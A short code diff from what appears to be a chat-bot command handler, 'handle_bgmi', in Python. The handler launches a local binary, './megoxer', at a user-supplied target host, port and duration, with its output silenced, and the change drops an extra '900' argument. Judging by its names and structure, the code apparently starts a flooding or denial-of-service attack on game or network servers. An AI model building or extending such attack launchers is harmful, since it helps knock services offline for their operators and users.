@@ -262,7 +262,7 @@ def handle_bgmi(message):
     
     try:
         subprocess.Popen(
-            ["./megoxer", target, str(port), str(duration), "900"],
+            ["./megoxer", target, str(port), str(duration)],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
